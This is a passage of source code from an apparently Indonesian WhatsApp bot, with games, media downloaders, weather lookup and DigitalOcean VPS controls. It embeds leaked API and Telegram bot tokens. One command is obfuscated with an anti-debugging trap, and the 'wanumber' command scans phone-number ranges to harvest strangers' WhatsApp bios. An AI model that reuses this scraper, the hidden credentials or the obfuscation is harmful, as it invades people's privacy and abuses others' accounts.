 Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Biiofc.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Biiofc.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Biiofc.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Biiofc.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 Biiofc.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(3000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 Biiofc.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await Biiofc.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Biiofc.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await Biiofc.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) Biiofc.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
case 'happymod':{
if (!q) return reply(`Example ${prefix+command} Sufway surfer mod`)
XeonStickWait()
let kat = await scp1.happymod(q)
reply(util.format(kat))
}
break
 case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
  Biiofc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let caption = `
❑ Title : ${anu.title}
❑ Ext : Search
❑ ID : ${anu.videoId}
❑ Duration : ${anu.timestamp}
❑ Viewers : ${anu.views}
❑ Upload At : ${anu.ago}
❑ Author : ${anu.author.name}
❑ Channel : ${anu.author.url}
❑ Description : ${anu.description}
❑ Url : ${anu.url}`
                Biiofc.sendMessage(m.chat, caption, [`Ytmp3 ${anu.url}`,`Ytmp4 ${anu.url}`])
            }
            break
case 'pinterest': {
              	if (!text) return reply(`Enter Query`)
XeonStickWait()
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
Biiofc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return reply(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		Biiofc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'lyrics': {
if (!text) return reply(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
XeonStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
reply(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'gdrive': {
		if (!args[0]) return replygcxeon(`Enter the Google Drive link`)
	XeonStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcxeon(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
Biiofc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case "spotify":{
if (!isPremium) return reply(mess.premium)
if (!text) return reply(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return reply(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await Biiofc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await Biiofc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
case "igimg": case "instaimg":  {
if (!text) return reply(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
XeonStickWait()
const risponsxeon = await XeonIgImg(text)
for (let i=0;i<risponsxeon.length;i++) {
let ghd = await Biiofc.sendFileUrl(m.chat, risponsxeon[i], `Here you go!`, m)
}
}
break 
case "fbvid": case "facebookvid":{
if (!text) return reply(`Where is the url?\n\nExample: ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
XeonStickWait()
let res = await XeonFb(q)
let ghdp = await Biiofc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
case "twittervid":case "twitvid":{
if (!text) return reply(`Where is the url?\n\nExample: ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
XeonStickWait()
let res = await XeonTwitter(q)
let ghdx = await Biiofc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
}
break
case 'telestick': { //credit agan
        	if (m.isGroup) return XeonStickPrivate()
        if (!isPremium) return reply(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await XeonBotInc[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
case "ytmp3": case "ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return reply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await Biiofc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await Biiofc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'weather':{
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           Biiofc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
 case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Biiofc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Biiofc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break    
case "sisadroplet":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isOwner) {
      return m.reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    m.reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    m.reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Sok Asik Anjg`)
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
